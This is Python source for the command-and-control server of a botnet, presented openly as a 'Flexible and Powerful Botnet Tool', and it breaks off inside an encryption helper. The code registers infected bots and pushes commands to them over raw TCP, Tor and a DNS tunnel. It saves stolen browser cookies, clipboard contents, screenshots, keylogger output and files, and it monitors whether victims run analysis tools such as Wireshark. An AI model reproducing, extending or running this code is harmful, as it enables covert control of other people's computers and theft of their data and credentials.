from http.server import HTTPServer, BaseHTTPRequestHandler
from stem.process import launch_tor_with_config
from urllib.parse import urlparse, parse_qs 
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from socketserver import ThreadingMixIn
from stem.control import Controller
from Crypto.Cipher import AES
from datetime import datetime
from stem.util import term
from stem import Signal
from queue import Queue
import threading
import readline
import platform
import requests
import hashlib
import socket
import base64
import struct
try:
    import socks  # PySocks for SOCKS5 proxy support
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False
    print("\033[93m[!] PySocks not available. Tor proxy features limited.\033[0m")
try:
    import dnslib
    from dnslib.server import DNSServer, DNSHandler, BaseResolver
    from dnslib import DNSRecord, QTYPE, RR, A, TXT
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False
    print("\033[93m[!] dnslib not available. DNS Tunneling features disabled.\033[0m")
import json
import time
import os


# Web dashboard import
try:
    from web_dashboard import start_web_dashboard
    WEB_DASHBOARD_AVAILABLE = True
except ImportError:
    WEB_DASHBOARD_AVAILABLE = False
    print("\033[93m[!] Web dashboard not available. \033[0m")

class C2Server:

    # Class-level commands dictionary
    commands = {}
    
    def __init__(self, host='0.0.0.0', port=8080, encryption_key="SecretBotNetKey2025"):
        self.host = host
        self.port = port
        self.bots = {}
        self.lock = threading.Lock()
        self.active = False
        self.command_queue = Queue()
        self.encryption_key = hashlib.sha256(encryption_key.encode()).digest()
        self.show_banner()
        os.makedirs("clipboard_data", exist_ok=True)
        
        # File server settings
        self.file_server_enabled = False
        self.file_server_host = '0.0.0.0'
        self.file_server_port = 8000
        self.file_server_thread = None
        self.file_server_tokens = {}  # bot_id: {token, expiry}
        self.file_server = None
        os.makedirs("bot_files", exist_ok=True)
        
        # Tor settings
        self.tor_enabled = False
        self.tor_process = None
        self.tor_controller = None
        self.tor_port = 9050  # Default Tor SOCKS5 port
        self.tor_proxy = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        # P2P port range information (to be communicated to bots)
        self.p2p_port_range = (49152, 65535)
        self.ipv6_enabled = socket.has_ipv6
        # Security rules and P2P status tracking
        self.security_rules_enabled = True
        self.p2p_status = {}  # Bot ID -> P2P status
        self.wireshark_alerts = {}  # Bot ID -> Wireshark alerts
        # Web Dashboard settings
        self.web_dashboard_enabled = False
        self.web_dashboard_host = '0.0.0.0'
        self.web_dashboard_port = 5500
        self.web_dashboard_thread = None
        
        # DNS Tunneling settings
        self.dns_tunnel_enabled = False
        self.dns_tunnel_domain = None
        self.dns_server = None
        self.dns_server_thread = None
        self.dns_port = 53
        self.dns_responses = {}  # Query ID -> Response data
        self.dns_command_queue = {}  # Bot ID -> Command queue for DNS tunnel bots
        self.dns_chunked_data = {}  # Bot ID -> Chunked data storage


        # Vulnerability Scanner integration (Disabled)
        self.vuln_scanner_enabled = False
        self.bot_vulnerabilities = {}  # Bot ID -> Vulnerability list
        self.platform_stats = {}  # Platform statistics
        self._init_vuln_scanner()

        # AI/ML integration removed (upon request)
        self.ai_ml_enabled = False
        self.ai_commands = {}

        # Network Mapping integration
        self.network_maps_enabled = True
        self.network_maps = {}  # Bot ID -> Network map Data
        self.network_maps_dir = "network_maps"
        os.makedirs(self.network_maps_dir, exist_ok=True)
        self._init_network_maps()

        # MCP Server settings (default disabled)
        self.mcp_enabled = False
        self.mcp_server = None
        self.mcp_thread = None

        # Command history features
        self.command_history = []
        self.history_file = "command_history.txt"
        self.max_history = 100
        self._load_command_history()
        self._setup_readline()

    def show_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        banner = r"""
            [Flexible and Powerful Botnet Tool]
  ___   __    ______   _________         ______   _____       
 /__/\ /__/\ /_____/\ /________/\       /_____/\ /_____/\     
 \::\_\\  \ \\::::_\/_\__....__\/_______\:::__\/ \:::_:\ \    
  \:. `-\  \ \\:\/___/\  \::\ \ /______/\\:\ \  __   _\:\|    
   \:. _    \ \\::___\/_  \::\ \\__::::\/ \:\ \/_/\ /::_/__   
    \. \`-\  \ \\:\____/\  \::\ \          \:\_\ \ \\:\____/\ 
     \__\/ \__\/ \_____\/   \__\/           \_____\/ \_____\/ 
                                By: Zer0 Crypt0
                                     version: 1.1.0
        """
        print("\033[95m" + banner + "\033[0m")
        print(f"\033[36m[+]\033[0m \033[94mListening on {self.host}:{self.port}\033[0m")
        print("\033[36m[+]\033[0m \033[94mWaiting for bots to connect...\033[0m\n")
    
    def start_tor(self):
        """Starting the Tor service"""
        try:
            if not self.tor_process:
                print(term.format("[+] Starting Tor", term.Color.BLUE))
                # Try connecting to the existing Tor network first.
                try:
                    self.tor_controller = Controller.from_port(address="127.0.0.1", port=9051)
                    self.tor_controller.authenticate()
                    print("\033[92m[+] Tor Controller connected\033[0m")
                    self.tor_enabled = True
                    return True
                except Exception as ce:
                    print(f"\033[93m[!] Tor Controller connect failed: {ce}\033[0m")
                    # If control port is not available, start Tor with Stem with the necessary settings
                    try:
                        self.tor_process = launch_tor_with_config(config={
                            'SocksPort': '9050',
                            'ControlPort': '9051',
                            'CookieAuthentication': '0'
                        }, take_ownership=True, timeout=30)
                        time.sleep(3)
                        self.tor_controller = Controller.from_port(address="127.0.0.1", port=9051)
                        self.tor_controller.authenticate()
                        print("\033[92m[+] Tor Service started and Controller connected\033[0m")
                        self.tor_enabled = True
                        return True
                    except Exception as le:
                        print(f"\033[91m[!] Tor Startup Error: {le}\033[0m")
                        self.tor_enabled = False
                        return False
            else:
                print("\033[93m[!] Tor is Already Running\033[0m")
                return False
        except Exception as e:
            print(f"\033[91m[!] Tor Startup Error: {e}\033[0m")
            return False
    
    def stop_tor(self):
        try:
            if self.tor_process:
                print("\033[94m[*] Tor Service Stopping...\033[0m")
                # Stop Tor
                self.tor_process.terminate()
                self.tor_process.wait()
                self.tor_process = None
                # Close Controller
                try:
                    if self.tor_controller:
                        self.tor_controller.close()
                        self.tor_controller = None
                except Exception:
                    pass
                print("\033[92m[+] Tor Service Stopped\033[0m")
                return True
            else:
                print("\033[93m[!] Tor is Not Running\033[0m")
                return False
        except Exception as e:
            print(f"\033[91m[!] Tor Stopping Error: {e}\033[0m")
            return False
    
    def renew_tor_identity(self):
        try:
            # Send NEWNYM signal via Stem Controller
            if self.tor_controller is None:
                try:
                    self.tor_controller = Controller.from_port(address="127.0.0.1", port=9051)
                    self.tor_controller.authenticate()
                except Exception as ce:
                    print(f"\033[91m[!] Tor Control Connection Not Found: {ce}\033[0m")
                    return False
            self.tor_controller.signal(Signal.NEWNYM)
            print("\033[92m[+] Tor Identity Renewed\033[0m")
            return True
        except Exception as e:
            print(f"\033[91m[!] Tor Identity Renewal Error: {e}\033[0m")
            return False
    
    def send_via_tor(self, data, host, port):
        """Send data via Tor SOCKS5 proxy"""
        if not SOCKS_AVAILABLE:
            print(f"\033[91m[!] PySocks not available. Install with: pip install PySocks\033[0m")
            return False
            
        try:
            # Connect via SOCKS5 proxy.
            sock = socks.socksocket()
            sock.set_proxy(socks.SOCKS5, "127.0.0.1", self.tor_port)
            sock.settimeout(10)  # 10 second timeout
            sock.connect((host, port))

            # Send data
            sock.send(data)

            # Receive response
            response = sock.recv(4096)
            sock.close()
            
            print(f"\033[92m[+] Data sent via Tor successfully\033[0m")
            return response
        except Exception as e:
            print(f"\033[91m[!] Error sending via Tor: {e}\033[0m")
            print(f"\033[93m[*] Make sure Tor is running on port {self.tor_port}\033[0m")
            return False
    
    def start_dns_tunnel(self, domain):
        """Start DNS Tunneling server"""
        if not DNS_AVAILABLE:
            print(f"\033[91m[!] dnslib not available. Install with: pip install dnslib\033[0m")
            return False
        
        if self.dns_tunnel_enabled:
            print(f"\033[93m[!] DNS Tunneling already enabled\033[0m")
            return False
        
        try:
            self.dns_tunnel_domain = domain

            # DNS Resolver class
            class DNSTunnelResolver(BaseResolver):
                def __init__(self, c2_server):
                    self.c2 = c2_server
                
                def resolve(self, request, handler):
                    reply = request.reply()
                    qname = str(request.q.qname).rstrip('.')
                    qtype = request.q.qtype

                    # Domain Check
                    if not qname.endswith(self.c2.dns_tunnel_domain):
                        # If another domain, return normal DNS response
                        return reply
                    
                    try:
                        # Extract data from subdomain
                        # Format: <base64_data>.<domain>
                        subdomain = qname.replace(f'.{self.c2.dns_tunnel_domain}', '')
                        
                        if not subdomain:
                            return reply
                        
                        # Base64 decode
                        try:
                            encoded_data = subdomain.replace('-', '+').replace('_', '/')
                            # Add padding
                            padding = 4 - (len(encoded_data) % 4)
                            if padding != 4:
                                encoded_data += '=' * padding
                            
                            decoded_data = base64.b64decode(encoded_data)
                            decrypted_data = self.c2.decrypt_data(decoded_data)
                            
                            # JSON parse
                            bot_data = json.loads(decrypted_data.decode('utf-8'))
                            
                            print(f"\033[94m[DNS Tunnel] Received from {bot_data.get('bot_id', 'Unknown')}\033[0m")
                            print(f"  \033[96m•\033[0m Action: {bot_data.get('action', 'unknown')}")
                            
                            # Save bot
                            if bot_data.get('action') == 'dns_tunnel_connect':
                                bot_id = bot_data.get('bot_id')
                                with self.c2.lock:
                                    if bot_id not in self.c2.bots:
                                        self.c2.bots[bot_id] = {
                                            'ip': bot_data.get('ip', 'unknown'),
                                            'platform': bot_data.get('platform', 'unknown'),
                                            'hostname': bot_data.get('hostname', 'unknown'),
                                            'connection_type': 'dns_tunnel',
                                            'dns_tunnel': True,
                                            'last_seen': time.time()
                                        }
                                    else:
                                        self.c2.bots[bot_id]['dns_tunnel'] = True
                                        self.c2.bots[bot_id]['connection_type'] = 'dns_tunnel'
                                        self.c2.bots[bot_id]['last_seen'] = time.time()

                            # Check for commands in queue for this bot
                            bot_id = bot_data.get('bot_id')
                            command_payload = None
                            with self.c2.lock:
                                if bot_id in self.c2.dns_command_queue and self.c2.dns_command_queue[bot_id]:
                                    # Get next command from queue
                                    command = self.c2.dns_command_queue[bot_id].pop(0)
                                    command_payload = {
                                        'type': 'command',
                                        'cmd_id': command.get('id'),
                                        'command': command.get('command'),
                                        'timestamp': time.time()
                                    }
                                    print(f"\033[95m[DNS Tunnel] Sending command to {bot_id}: {command.get('command')}\033[0m")
                            
                            # Prepare response with command if available
                            if command_payload:
                                response_data = {
                                    'status': 'ok',
                                    'timestamp': time.time(),
                                    'has_command': True,
                                    'command': command_payload
                                }
                            else:
                                response_data = {
                                    'status': 'ok',
                                    'timestamp': time.time(),
                                    'has_command': False,
                                    'message': 'No commands pending'
                                }

                            # Encrypt and encode the response
                            response_json = json.dumps(response_data)
                            encrypted_response = self.c2.encrypt_data(response_json.encode('utf-8'))
                            encoded_response = base64.b64encode(encrypted_response).decode('utf-8')

                            # Make it URL-safe
                            encoded_response = encoded_response.replace('+', '-').replace('/', '_').replace('=', '')

                            # Handle chunked data for large responses (255 char limit per TXT record)
                            chunks = []
                            for i in range(0, len(encoded_response), 200):  # 200 chars per chunk to be safe
                                chunk = encoded_response[i:i+200]
                                chunks.append(chunk)
                            
                            # Send first chunk in main response
                            if chunks:
                                reply.add_answer(RR(
                                    rname=qname,
                                    rtype=QTYPE.TXT,
                                    rdata=TXT(chunks[0]),
                                    ttl=0
                                ))
                                
                                # Store remaining chunks for subsequent queries
                                if len(chunks) > 1:
                                    self.c2.dns_chunked_data[bot_id] = {
                                        'chunks': chunks[1:],
                                        'timestamp': time.time(),
                                        'total': len(chunks),
                                        'current': 1
                                    }
                            
                        except Exception as e:
                            print(f"\033[91m[DNS Tunnel] Encode error: {e}\033[0m")
                    
                    except Exception as e:
                        print(f"\033[91m[DNS Tunnel] Error: {e}\033[0m")
                    
                    return reply

            # Start DNS Server
            resolver = DNSTunnelResolver(self)
            self.dns_server = DNSServer(resolver, port=self.dns_port, address='0.0.0.0')

            # Start in a thread
            self.dns_server_thread = threading.Thread(target=self.dns_server.start, daemon=True)
            self.dns_server_thread.start()
            
            self.dns_tunnel_enabled = True
            print(f"\033[92m[+] DNS Tunneling enabled\033[0m")
            print(f"  \033[96m•\033[0m Domain: {domain}")
            print(f"  \033[96m•\033[0m Port: {self.dns_port}")
            print(f"  \033[93m⚠️  Note: Port 53 requires root/admin privileges\033[0m")
            
            return True
            
        except PermissionError:
            print(f"\033[91m[!] Permission denied. Port 53 requires root/admin privileges\033[0m")
            print(f"\033[93m[*] Run with: sudo python3 Server.py\033[0m")
            return False
        except Exception as e:
            print(f"\033[91m[!] DNS Tunneling start error: {e}\033[0m")
            return False
    
    def stop_dns_tunnel(self):
        """Stop DNS Tunneling server"""
        if not self.dns_tunnel_enabled:
            print(f"\033[93m[!] DNS Tunneling not enabled\033[0m")
            return False
        
        try:
            if self.dns_server:
                self.dns_server.stop()
                self.dns_server = None
            
            self.dns_tunnel_enabled = False
            self.dns_tunnel_domain = None
            
            print(f"\033[92m[+] DNS Tunneling stopped\033[0m")
            return True
        except Exception as e:
            print(f"\033[91m[!] DNS Tunneling stop error: {e}\033[0m")
            return False
    
    def queue_dns_command(self, bot_id, command):
        """Queue a command for a DNS tunnel bot"""
        try:
            with self.lock:
                if bot_id not in self.dns_command_queue:
                    self.dns_command_queue[bot_id] = []
                
                cmd_entry = {
                    'id': f"dns_cmd_{int(time.time())}_{len(self.dns_command_queue[bot_id])}",
                    'command': command,
                    'timestamp': time.time(),
                    'status': 'pending'
                }
                self.dns_command_queue[bot_id].append(cmd_entry)
                print(f"\033[94m[DNS Tunnel] Command queued for {bot_id}: {command}\033[0m")
                return True
        except Exception as e:
            print(f"\033[91m[!] DNS command queue error: {e}\033[0m")
            return False


    def handle_bot(self, conn, addr):
        bot_ip = addr[0]
        bot_id = None
        try:
            # Enable TCP keepalive to detect dead peers
            try:
                conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            except Exception:
                pass
            
            # Framing helpers (length-prefixed packets)
            def recv_exact(n:int) -> bytes:
                buf = b''
                while len(buf) < n:
                    chunk = conn.recv(n - len(buf))
                    if not chunk:
                        raise ConnectionError("Connection closed while reading")
                    buf += chunk
                return buf
            
            def recv_packet() -> bytes:
                header = recv_exact(4)
                (length,) = struct.unpack('!I', header)
                if length <= 0 or length > 10 * 1024 * 1024:
                    raise ValueError("Invalid packet length")
                return recv_exact(length)
            
            def send_packet(data: bytes):
                conn.sendall(struct.pack('!I', len(data)) + data)
            # Bot registration (framed) on the first connection
            data = recv_packet()
            if data:
                # Decrypt the data
                decrypted_data = self.decrypt_data(data)
                message = json.loads(decrypted_data)
                bot_id = message.get('bot_id')
                
            
                with self.lock:
                    # Use the real IP, otherwise use the connection IP
                    display_ip = message.get('real_ip', bot_ip)
                    self.bots[bot_id] = {
                        'ip': display_ip,  # Save the real IP
                        'connection_ip': bot_ip,  # Also save the connection IP
                        'last_seen': time.time(),
                        'conn': conn,
                        'response_received': threading.Event(),
                        'tor_enabled': message.get('tor_enabled', False),
                        'platform': message.get('platform', 'Unknown')
                    }
                print(f"\033[92m[+] New bot connected: {bot_id} ({display_ip})")
                if message.get('tor_enabled', False):
                    print(f"\033[94m[+] Bot connected via Tor\033[0m")
                else:
                    print(f"\033[94m[+] Bot connected via Clearnet\033[0m")

                # Send encrypted response (P2P port range added)
                response = json.dumps({
                    'status': 'registered',
                    'p2p_port_range': self.p2p_port_range,
                    'ipv6_enabled': True  # IPv6 support information
                }).encode('utf-8')
                encrypted_response = self.encrypt_data(response)
                send_packet(encrypted_response)

            # Command and response loop
            while self.active:
                try:
                    # Send command
                    if not self.command_queue.empty():
                        cmd = self.command_queue.get()
                        if cmd['bot_id'] == bot_id or cmd['bot_id'] == 'broadcast':
                            # Encrypt the command
                            command_data = json.dumps(cmd).encode('utf-8')
                            encrypted_command = self.encrypt_data(command_data)
                            
                            # Tor check - if Tor is active and the bot is connected via Tor...
                            bot_via_tor = self.bots[bot_id].get('tor_enabled', False)
                            if self.tor_enabled and bot_via_tor and SOCKS_AVAILABLE:
                                print(f"\033[94m[*] Sending command via Tor to {bot_id}\033[0m")
                                # Use real Tor SOCKS5 proxy
                                try:
                                    # Get the bot's IP and port information
                                    bot_ip = self.bots[bot_id].get('ip', addr[0])
                                    # Send via Tor
                                    tor_response = self.send_via_tor(encrypted_command, bot_ip, self.port)
                                    if not tor_response:
                                        # If Tor fails, fall back to normal socket
                                        print(f"\033[93m[*] Tor failed, falling back to clearnet for {bot_id}\033[0m")
                                        send_packet(encrypted_command)
                                except Exception as e:
                                    print(f"\033[91m[!] Tor send error: {e}\033[0m")
                                    send_packet(encrypted_command)
                            else:
                                # Send over a normal clearnet
                                if self.tor_enabled and bot_via_tor and not SOCKS_AVAILABLE:
                                    print(f"\033[93m[*] Tor requested but PySocks not available, using clearnet\033[0m")
                                send_packet(encrypted_command)
                            
                            self.bots[bot_id]['response_received'].clear()

                    # Receive response (framed)
                    conn.settimeout(2)
                    response = recv_packet()
                    if response:
                        # Decrypt the response
                        decrypted_response = self.decrypt_data(response)
                        response_data = json.loads(decrypted_response)
                        # Heartbeat only updates last_seen.
                        if response_data.get('action') == 'heartbeat' and bot_id:
                            with self.lock:
                                if bot_id in self.bots:
                                    self.bots[bot_id]['last_seen'] = time.time()
                            continue
                        
                        if response_data.get('alert_type') == 'wireshark_status':
                            bot_id = response_data.get('bot_id')
                            status = "STOPPED" if response_data.get('is_active') else "RUNNING"
                            print(f"\033[91m[!] {bot_id} Wireshark status: {status}\033[0m")
                            continue  # Skip other operations
                        
                        elif response_data.get('alert_type') == 'analiz_tespit':
                            bot_id = response_data.get('bot_id')
                            alert_msg = response_data.get('output', 'Unknown alert')
                            print(f"\033[91m[!] {bot_id} Security Alert: {alert_msg}\033[0m")

                            # Save the Wireshark alert
                            with self.lock:
                                self.wireshark_alerts[bot_id] = {
                                    'timestamp': time.time(),
                                    'message': alert_msg,
                                    'status': 'detected'
                                }
                            continue
                        
                        elif response_data.get('alert_type') == 'analiz_temiz':
                            bot_id = response_data.get('bot_id')
                            alert_msg = response_data.get('output', 'Analysis tools stopped')
                            print(f"\033[92m[+] {bot_id} Security Cleared: {alert_msg}\033[0m")

                            # Clear the Wireshark alert
                            with self.lock:
                                if bot_id in self.wireshark_alerts:
                                    del self.wireshark_alerts[bot_id]
                            continue
                        
                        elif response_data.get('action') == 'p2p_status':
                            bot_id = response_data.get('bot_id')
                            p2p_status = response_data.get('p2p_status', 'unknown')
                            print(f"\033[94m[*] {bot_id} P2P Status: {p2p_status}\033[0m")

                            # Save the P2P status
                            with self.lock:
                                self.p2p_status[bot_id] = {
                                    'status': p2p_status,
                                    'timestamp': time.time()
                                }
                            continue
                        
                        elif response_data.get('action') == 'vulnerability_scan':
                            # Vulnerability Scan Reports : Disabled :(
                            print("\033[93m[!] Vulnerability scan reports are disabled (ExploitDB/PacketStorm/NVD/CVE Details/SecurityFocus).\033[0m")
                            continue
                        
                        elif response_data.get('action') == 'security_alert':
                            bot_id = response_data.get('bot_id')
                            target_ip = response_data.get('target_ip')
                            security_message = response_data.get('security_message', 'Unknown security alert')
                            attack_blocked = response_data.get('attack_blocked', False)
                            security_details = response_data.get('security_details', {})
                            
                            print(f"\033[91m[!] {bot_id} Security Alert:\033[0m")
                            print(f"   \033[96m•\033[0m Target: {target_ip}")
                            print(f"   \033[96m•\033[0m Message: {security_message}")
                            print(f"   \033[96m•\033[0m Attack Blocked: {'Yes' if attack_blocked else 'No'}")
                            
                            # Show security details
                            if security_details:
                                print(f"   \033[96m•\033[0m Security Details:")
                                print(f"     - Firewall: {'Detected' if security_details.get('firewall_detected') else 'Not Detected'}")
                                print(f"     - DDoS Protection: {'Yes' if security_details.get('ddos_protection') else 'No'}")
                                print(f"     - WAF: {'Detected' if security_details.get('waf_detected') else 'Not Detected'}")
                                print(f"     - Rate Limiting: {'Yes' if security_details.get('rate_limiting') else 'No'}")
                                print(f"     - Security Level: {security_details.get('security_level', 'Unknown')}")
                            
                            # Save the security alert
                            with self.lock:
                                if 'security_alerts' not in self.__dict__:
                                    self.security_alerts = {}
                                self.security_alerts[bot_id] = {
                                    'target_ip': target_ip,
                                    'message': security_message,
                                    'attack_blocked': attack_blocked,
                                    'security_details': security_details,
                                    'timestamp': time.time()
                                }
                            continue
                        
                        # Ignore heartbeat messages (to keep the connection alive)
                        elif response_data.get('action') == 'heartbeat':
                            continue

                            # Command result (Net.py -> action: 'command_result')
                        elif response_data.get('action') == 'command_result':
                            bot_id = response_data.get('bot_id', bot_id)
                            output = response_data.get('output', 'No output')
                            
                            # Check if there's a pending MCP response waiting for this bot
                            if hasattr(self, '_mcp_pending_responses') and bot_id in self._mcp_pending_responses:
                                pending = self._mcp_pending_responses[bot_id]
                                pending['output'] = output
                                pending['event'].set()
                            
                            # processes command special handling
                            if hasattr(self, '_pending_processes_command') and self._pending_processes_command.get('bot_id') == bot_id:
                                try:
                                    import json as _json
                                    data = _json.loads(output)
                                    
                                    # Write to file
                                    self._save_processes_to_file(bot_id, data)
                                    
                                    print("\n\033[95mProcess Information:\033[0m")
                                    self._print_processes_info(data)
                                    print()
                                    
                                    # Pending command'i temizle
                                    self._pending_processes_command = None
                                    
                                except Exception as e:
                                    print(f"\033[91m[!] Error processing processes info: {str(e)}\033[0m")
                                    print(f"Raw response: {output}")
                                    
                                    # Also write raw response to file on error
                                    self._save_raw_processes_to_file(bot_id, str(output))
                                    
                                    # Pending command'i temizle
                                    self._pending_processes_command = None
                            else:
                                # Normal command result
                                print(f"\033[96m{bot_id}\033[0m : {output}")
                            
                            self.bots[bot_id]['response_received'].set()
                            continue

                        # Cookie result: action 'cookies_result'
                        elif response_data.get('action') == 'cookies_result' and response_data.get('status') == 'success':
                            bot_id = response_data.get('bot_id')
                            cookies = response_data.get('cookies', [])
                            # Create cookies folder if not exists
                            os.makedirs("cookies", exist_ok=True)
                            with open(f"cookies/cookie_{bot_id}.txt", "w") as f:
                                if cookies:
                                    for cookie in cookies:
                                        f.write(f"{cookie['domain']}\t{cookie['name']}\t{cookie['value']}\n")
                                    print(f"\033[92m[+] {bot_id} cookies saved\033[0m")
                                else:
                                    f.write("Cookies are empty")
                                    print(f"\033[93m[!] {bot_id} cookies not found\033[0m")
                        
                        elif response_data.get('action') == 'clipboard_data':
                            bot_id = response_data.get('bot_id', 'unknown')
                            clipboard_data = response_data.get('data', '')
                            filename = f"clipboard_data/copy_{bot_id.replace('/', '_').replace('\\', '_')}.txt"
                            with open(filename, "a", encoding="utf-8") as f:
                                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: {clipboard_data}\n")
                            print(f"\033[92m[+] Clipboard data saved to {filename}\033[0m")
                            continue
                        
                        elif response_data.get('type') == 'screenshot':
                            bot_id = response_data.get('bot_id', 'unknown')
                            filename = response_data.get('filename', 'screenshot.png')
                            img_data = response_data.get('data', '')
                            
                            # Create ScreenS folder
                            os.makedirs("ScreenS", exist_ok=True)
                            
                            # Convert from Base64 to PNG and save
                            try:
                                import base64
                                img_bytes = base64.b64decode(img_data)
                                filepath = f"ScreenS/{filename}"
                                with open(filepath, "wb") as f:
                                    f.write(img_bytes)
                                print(f"\033[92m[+] Screenshot saved: {filepath}\033[0m")
                            except Exception as e:
                                print(f"\033[91m[!] Screenshot save error: {e}\033[0m")
                            continue
                        
                        elif response_data.get('action') == 'network_map_data':
                            bot_id = response_data.get('bot_id', 'unknown')
                            network_data = response_data.get('network_data', {})
                            map_format = response_data.get('map_format', 'json')
                            scope = response_data.get('scope', 'unknown')
                            timestamp = response_data.get('timestamp', time.time())
                            
                            # Network map data processing and saving
                            self._process_network_map(bot_id, network_data, map_format, scope, timestamp)
                            continue
                        
                        elif response_data.get('action') == 'file_download':
                            bot_id = response_data.get('bot_id', 'unknown')
                            file_info = response_data.get('file_info', {})
                            file_content = response_data.get('file_content', '')
                            
                            try:
                                # Get file information
                                file_name = file_info.get('name', 'unknown_file')
                                file_path = file_info.get('path', '')
                                file_size = file_info.get('size', 0)
                                
                                # Make filename safe
                                safe_filename = "".join(c for c in file_name if c.isalnum() or c in ('.-_')).rstrip()
                                if not safe_filename:
                                    safe_filename = f"downloaded_file_{int(time.time())}"
                                
                                # Save to server working directory (not in downloads/)
                                file_full_path = safe_filename
                                
                                # Base64 decode and save
                                file_content_decoded = base64.b64decode(file_content)
                                with open(file_full_path, 'wb') as f:
                                    f.write(file_content_decoded)
                                
                                print(f"\033[92m[+] 📁 File downloaded: {safe_filename}\033[0m")
                                print(f"  \033[96m•\033[0m Size: {file_size:,} bytes")
                                print(f"  \033[96m•\033[0m Location: {file_full_path}")
                                print(f"  \033[96m•\033[0m Bot: {bot_id}")
                                
                                # Save download log
                                download_log = {
                                    'timestamp': time.time(),
                                    'bot_id': bot_id,
                                    'original_path': file_path,
                                    'saved_path': file_full_path,
                                    'file_size': file_size
                                }
                                
                                # Save to log file
                                log_file = 'download_log.json'
                                try:
                                    if os.path.exists(log_file):
                                        with open(log_file, 'r') as f:
                                            logs = json.load(f)
                                    else:
                                        logs = []
                                    
                                    logs.append(download_log)
                                    
                                    with open(log_file, 'w') as f:
                                        json.dump(logs, f, indent=2)
                                except:
                                    pass
                                    
                            except Exception as e:
                                print(f"\033[91m[!] File save error: {str(e)}\033[0m")
                            
                            continue
                        
                        elif response_data.get('action') == 'folder_detected':
                            bot_id = response_data.get('bot_id', 'unknown')
                            remote_path = response_data.get('remote_path', '')
                            folder_contents = response_data.get('folder_contents', [])
                            folder_size = response_data.get('folder_size', 0)
                            
                            print(f"\033[94m[📁] Folder detected (Bot: {bot_id})\033[0m")
                            print(f"  \033[96m•\033[0m Path: {remote_path}")
                            print(f"  \033[96m•\033[0m Total Size: {folder_size:,} bytes")
                            print(f"  \033[96m•\033[0m Content Count: {len(folder_contents)}")
                            
                            if folder_contents:
                                print(f"  \033[96m•\033[0m Contents:")
                                for item in folder_contents[:10]:  # First 10 items
                                    item_type = "📁" if item.get('type') == 'folder' else "📄"
                                    item_size = f"({item.get('size', 0):,} bytes)" if item.get('size') else ""
                                    print(f"    {item_type} {item.get('name', 'Unknown')} {item_size}")
                                
                                if len(folder_contents) > 10:
                                    print(f"    ... and {len(folder_contents) - 10} more items")
                            
                            print(f"\033[93m[!] Folders are not downloaded, only files can be downloaded\033[0m")
                            continue
                        
                        print(f"\033[96m{bot_id}\033[0m : {response_data.get('output', 'No output')}")
                        self.bots[bot_id]['response_received'].set()
                    else:
                        break
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"\033[91m[!] Communication error: {e}\033[0m")
                    break
                
        except Exception as e:
            print(f"\033[91m[!] Error with {bot_id if bot_id else 'bot'}: {e}\033[0m")
        finally:
            if bot_id:
                with self.lock:
                    if bot_id in self.bots:
                        del self.bots[bot_id]
                print(f"\033[93m[-] Bot disconnected: {bot_id}\033[0m")
            conn.close()
    
    def handle_command(self, command):
        """Handle incoming commands from the console"""
        if not command.strip():
            return
            
        # Split command into parts
        parts = command.split()
        cmd = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []
        
        # Check for help request (? at the end)
        if len(args) > 0 and args[-1] == '?':
            # Handle compound commands like "tor enable ?"
            if len(args) > 1:
                compound_cmd = f"{cmd} {args[0]}"
                if compound_cmd in ['tor enable', 'tor disable', 'tor renew', 'tor status', 'web start', 'web stop', 'web status']:
                    self._show_command_help(cmd)  # Show main command help
                    return
            self._show_command_help(cmd)
            return
        
        # Handle single word help requests like "tor ?"
        if cmd in ['tor', 'web', 'keylogger', 'clipboard'] and len(args) == 1 and args[0] == '?':
            self._show_command_help(cmd)
            return
        
        # Handle file server commands
        if cmd == 'fileserver':
            result = self.handle_fileserver_command(args)
            print(result)
            return
            
        # Handle token generation
        elif cmd == 'token':
            result = self.handle_token_command(args)
            print(result)
            return
            
        # Handle file upload (send to bot)
        elif cmd == 'upload':
            if len(args) < 2:
                self._show_command_help('upload')
                return
            bot_id = args[0]
            local_file = args[1]
            remote_name = args[2] if len(args) > 2 else os.path.basename(local_file)
            if not os.path.exists(local_file):
                print(f"Error: File not found: {local_file}")
                return
            try:
                with open(local_file, 'rb') as f:
                    file_bytes = f.read()
                b64_data = base64.b64encode(file_bytes).decode('utf-8')
                self.command_queue.put({
                    'bot_id': bot_id,
                    'command': f"file_upload {remote_name} {b64_data}",
                    'action': 'file_upload',
                    'silent': True
                })
                print(f"\033[92m[+] File upload command queued for {bot_id}: {remote_name}\033[0m")
            except Exception as e:
                print(f"\033[91m[!] File read error: {e}\033[0m")
            return
            
        # Handle file download
        elif cmd == 'download':
            if len(args) < 2:
                self._show_command_help('download')
                return
                
            bot_id = args[0]
            remote_file = args[1]
            local_path = args[2] if len(args) > 2 else os.path.basename(remote_file)
            
            # Check if file exists in bot's directory
            bot_dir = os.path.join('bot_files', bot_id)
            src_path = os.path.join(bot_dir, remote_file)
            
            if not os.path.exists(src_path):
                print(f"Error: File not found in bot {bot_id}: {remote_file}")
                return
                
            # Copy file from bot's directory
            try:
                import shutil
                shutil.copy2(src_path, local_path)
                print(f"File downloaded successfully from {bot_id} to {local_path}")
            except Exception as e:
                print(f"Error downloading file: {str(e)}")
            return
            
        # Handle other commands
        elif cmd in ["keylogger_start", "keylogger_stop", "clipboard_start", "clipboard_stop"]:
            self.command_queue.put({
                'bot_id': args[0],
                'command': cmd,
                'action': 'execute',
                'silent': True  # No output to main console
            })
            return

        # Legacy 'upload <PATH> <ID>' form is removed; use 'upload <bot_id> <local_file>'

        self.command_queue.put({
            'bot_id': args[0],
            'command': cmd,
            'action': 'execute'
        })
        return True

    def encrypt_data(self, data):
        """Encrypt data using AES-256-GCM (nonce + ciphertext + tag)"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        # 12 byte nonce (recommended for GCM)
        nonce = get_random_bytes(12)
        cipher = AES.new(self.encryption_key, AES.MODE_GCM, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        # Combine as nonce + ciphertext + tag
